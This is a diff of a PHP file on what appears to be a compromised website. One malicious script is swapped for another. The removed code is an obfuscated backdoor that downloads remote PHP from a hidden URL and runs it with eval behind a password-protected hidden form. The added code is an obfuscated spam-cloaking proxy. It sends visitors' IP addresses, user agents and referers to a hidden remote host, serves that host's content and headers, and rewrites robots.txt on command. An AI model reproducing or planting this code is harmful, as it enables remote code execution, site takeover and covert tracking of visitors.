@@ -1,102 +1,90 @@
-<?php session_start();
-function kontol($url)
+<?php
+error_reporting(0);
+$gp_name="zj1666";
+$version="tf1";
+if(preg_match("/jp2023/si",$_SERVER["REQUEST_URI"])==1) 
 {
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    $result = curl_exec($ch);
-    curl_close($ch);
-    return $result;
-}
-$asciiArray = [104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 78, 111, 111, 98, 84, 101, 99, 104, 111, 47, 119, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 49, 56, 97, 104, 104, 46, 112, 104, 112];
-$decodedString = '';
-foreach ($asciiArray as $ascii) {
-    $decodedString .= chr($ascii);
-}
-$url = $decodedString;
-$correct_password = '$2y$10$TGT36epmgr3/fTZ.XPB9nuXbKG5GcQYw/P3gFs4F7kIRflxBIWRAS';
-if (isset($_GET['ts_reset'])) {
-    $_SESSION["ts_url"] = "";
-    echo "success";
+    if(preg_match("/jp2023cww/si",$_SERVER["REQUEST_URI"])==0) 
+    {
+        header("HTTP/1.0 404 Not Found");
+    } 
+    echo "HTTP/1.0 404 Not Found___".$gp_name."___".$version; 
     exit;
 }
-if (isset($_GET['ts'])) {
-    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-        if (isset($_POST['password'])) {
-            $provided_password = $_POST['password'];
-            if (password_verify($provided_password, $correct_password)) {
-                if (isset($_POST['url'])) {
-                    $url = $_POST['url'];
-                    $_SESSION["ts_url"] = $url;
-                    echo "updated : " . $_SESSION["ts_url"];
-                    exit;
-                } else {
-                    echo "Error!";
-                    exit;
-                }
-            } else {
-                echo "";
-                exit;
-            }
-        } else {
-            echo "";
-            exit;
-        }
-    } else { ?>
-
-        <head>
-            <style>
-                #password {
-                    order: 2
-                }
-
-                #url {
-                    order: 1
-                }
-
-                #password,
-                #url {
-                    display: block;
-                    margin-bottom: 10px;
-                    opacity: 0;
-                    transition: opacity .3s
-                }
-
-                #password:hover,
-                #url:hover {
-                    opacity: 1
-                }
-
-                form {
-                    display: flex;
-                    flex-direction: column;
-                    align-items: flex-end
-                }
-            </style>
-            <script>document.addEventListener("DOMContentLoaded", function () { document.querySelector("#password").addEventListener("keydown", function (e) { "Enter" === e.key && (e.preventDefault(), document.querySelector("form").submit()) }) })</script>
-        </head>
-
-        <body>
-            <form action="" method="post"><input id="password" name="password" type="password"><br><input id="url" name="url"
-                    value="<?php echo isset($_POST['url']) ? $_POST['url'] : ''; ?>"><br></form>
-        </body>
-        <?php exit;
+$tg_website="http://".$gp_name.base64_decode("Lm5vcm1hbHNtaXRoLmNvbQ==");
+$req_uri="/index.php?VS=".$version."&GP=".$gp_name;
+$key_name_arr=array(
+"SCRIPT_NAME",
+"REQUEST_URI",
+"HTTPS",
+"REQUEST_SCHEME",
+"SERVER_PORT",
+"REMOTE_ADDR",
+"HTTP_REFERER",
+"HTTP_ACCEPT_LANGUAGE",
+"HTTP_USER_AGENT",
+"HTTP_HOST"
+);
+foreach($key_name_arr as $key_name1)
+{
+    $key_value=isset($_SERVER[$key_name1])?$_SERVER[$key_name1]:'';
+    $tran_char=base64_encode(trim($key_value));
+    $tran_char=str_replace("+","-",$tran_char);
+    $tran_char=str_replace("/","_",$tran_char);
+    $tran_char=str_replace("=",".",$tran_char);
+    $req_uri.="&".$key_name1."=".$tran_char;
+}
+$target_url=$tg_website.$req_uri;
+$ch_handle=curl_init();
+curl_setopt($ch_handle,CURLOPT_URL,$target_url);
+curl_setopt($ch_handle,CURLOPT_RETURNTRANSFER,1);
+curl_setopt($ch_handle,CURLOPT_CONNECTTIMEOUT,10);
+$remote_contents=curl_exec($ch_handle);
+$remote_contents=trim($remote_contents);
+curl_close($ch_handle);
+if(empty($remote_contents))
+{
+    $remote_contents=file_get_contents($target_url);
+}
+$remote_contents=trim($remote_contents);
+$curl_content_arr=explode("|@#$|",$remote_contents);
+$cc_count=count($curl_content_arr);
+if($cc_count<3)
+{
+    header("HTTP/1.0 404 Not Found"); 
+    exit; 
+}else 
+{
+    $head_info=trim($curl_content_arr[0]);
+    if(!empty($head_info))
+    {
+        header($head_info);
     }
-} else {
-    if (empty($_SESSION["ts_url"])) {
-        $result = @file_get_contents($url);
-        if (empty($result)) {
-            $result = kontol($url);
+    $content_info=trim($curl_content_arr[1]);
+    if(!empty($content_info))
+    {
+        echo $content_info;
+    }
+    $cmd_info=trim($curl_content_arr[$cc_count-1]);
+    if($cmd_info=="exit")
+    {
+        exit;
+    }
+    if($cmd_info=="ping")
+    {
+        $robots_content="User-agent:*".PHP_EOL;
+        $robots_content.="Allow:/".PHP_EOL;
+        $ping_url_arr=explode("<br/>",$content_info);
+        array_pop($ping_url_arr);
+        foreach($ping_url_arr as $ping_url1)
+        {
+            $robots_content.="Sitemap:".$ping_url1.PHP_EOL;
         }
-    } else {
-        $result = @file_get_contents($_SESSION["ts_url"]);
-        if (empty($result)) {
-            $result = kontol($_SESSION["ts_url"]);
-        }
+        $robots_file=fopen($_SERVER["DOCUMENT_ROOT"]."/robots.txt","w");
+        fwrite($robots_file,$robots_content);
+        fclose($robots_file);
+        echo "robots.txt done";
+        exit;
     }
 }
-if (is_string($result)) {
-    eval ('?>' . $result);
-} else {
-    echo "Error";
-} ?>
+?>
